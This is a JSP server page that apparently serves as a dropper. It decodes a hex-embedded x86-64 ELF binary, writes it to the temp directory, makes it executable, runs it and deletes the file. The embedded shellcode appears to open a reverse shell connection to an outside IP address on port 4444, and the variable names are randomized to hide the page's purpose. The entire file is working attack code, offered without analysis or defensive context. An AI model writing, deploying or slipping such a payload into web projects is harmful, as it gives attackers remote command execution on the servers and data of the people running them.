<%@ page import="java.io.*" %>
<%
  String VFardeTCPd = "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000007000000000000000000000000004000000000000000400000000000fa000000000000007c01000000000000001000000000000031ff6a095899b6104889d64d31c96a22415a6a075a0f054885c078516a0a4159506a2958996a025f6a015e0f054885c0783b489748b90200115cbe029321514889e66a105a6a2a580f05594885c0792549ffc97418576a23586a006a054889e74831f60f0559595f4885c079c76a3c586a015f0f055e6a7e5a0f054885c078edffe6";
  String HEqMuSLadpTxxDa = System.getProperty("java.io.tmpdir") + "/TzZBCwnEXXafHzU";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    HEqMuSLadpTxxDa = HEqMuSLadpTxxDa.concat(".exe");
  }

  int BKFMhSODvjBkkG = VFardeTCPd.length();
  byte[] swbZvnAS = new byte[BKFMhSODvjBkkG/2];
  for (int QTXPYpeJtm = 0; QTXPYpeJtm < BKFMhSODvjBkkG; QTXPYpeJtm += 2) {
    swbZvnAS[QTXPYpeJtm / 2] = (byte) ((Character.digit(VFardeTCPd.charAt(QTXPYpeJtm), 16) << 4)
                                              + Character.digit(VFardeTCPd.charAt(QTXPYpeJtm+1), 16));
  }

  FileOutputStream hNxtLgBwhC = new FileOutputStream(HEqMuSLadpTxxDa);
  hNxtLgBwhC.write(swbZvnAS);
  hNxtLgBwhC.flush();
  hNxtLgBwhC.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] vEDrOoqZoQv = new String[3];
    vEDrOoqZoQv[0] = "chmod";
    vEDrOoqZoQv[1] = "+x";
    vEDrOoqZoQv[2] = HEqMuSLadpTxxDa;
    Process sJybUSgQqgzbeLW = Runtime.getRuntime().exec(vEDrOoqZoQv);
    if (sJybUSgQqgzbeLW.waitFor() == 0) {
      sJybUSgQqgzbeLW = Runtime.getRuntime().exec(HEqMuSLadpTxxDa);
    }

    File bmBuMhJDFnoip = new File(HEqMuSLadpTxxDa); bmBuMhJDFnoip.delete();
  } else {
    String[] SJkFPAJjVfsUsiR = new String[1];
    SJkFPAJjVfsUsiR[0] = HEqMuSLadpTxxDa;
    Process sJybUSgQqgzbeLW = Runtime.getRuntime().exec(SJkFPAJjVfsUsiR);
  }
%>
